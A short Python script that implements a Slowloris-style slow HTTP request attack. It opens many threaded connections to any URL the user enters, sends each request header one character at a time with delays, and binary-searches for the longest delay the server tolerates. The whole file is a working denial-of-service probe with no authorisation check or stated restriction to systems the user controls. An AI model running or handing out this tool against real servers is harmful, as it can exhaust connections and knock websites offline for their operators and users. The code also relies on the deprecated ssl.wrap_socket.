import socket
import ssl
import time
from urllib.parse import urlparse
import concurrent.futures
import random

def loris(url, delay):
    parsed_url = urlparse(url)
    if parsed_url.scheme == 'https':
        port = 443
        use_ssl = True
    else:
        port = 80
        use_ssl = False
    if parsed_url.path:
        request_path = parsed_url.path
    else:
        request_path = '/'
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((parsed_url.hostname, port))
        if use_ssl:
            ssl_socket = ssl.wrap_socket(client_socket)
        else:
            ssl_socket = client_socket
        request = f"GET {request_path} HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
        for character in request:
            ssl_socket.sendall(character.encode())
            time.sleep(delay)
        response = ssl_socket.recv(4096)
        return True
    except ConnectionRefusedError:
        return False
    finally:
        if use_ssl:
            ssl_socket.close()
        client_socket.close()


def run_loris(delay, url):
    result = loris(url, delay)
    if result:
        return True
    else:
        return False


def find_max_delay(num_threads, url):
    min_delay = 0.0
    max_delay = 10.0  # Set an upper bound for the delay
    precision = 0.1  # Adjust precision based on your requirements

    while max_delay - min_delay > precision:
        delay = (min_delay + max_delay) / 2.0

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(run_loris, delay, url) for _ in range(num_threads)]
            concurrent.futures.wait(futures)

        successful_results = [future.result() for future in futures if future.result()]

        if successful_results:
            min_delay = delay
        else:
            max_delay = delay

    return min_delay


num_threads = int(input("Enter the number of threads: "))
website_url = input("Enter the URL to test: ")

max_delay = find_max_delay(num_threads, website_url)
print(f"The maximum delay possible is: {max_delay}")
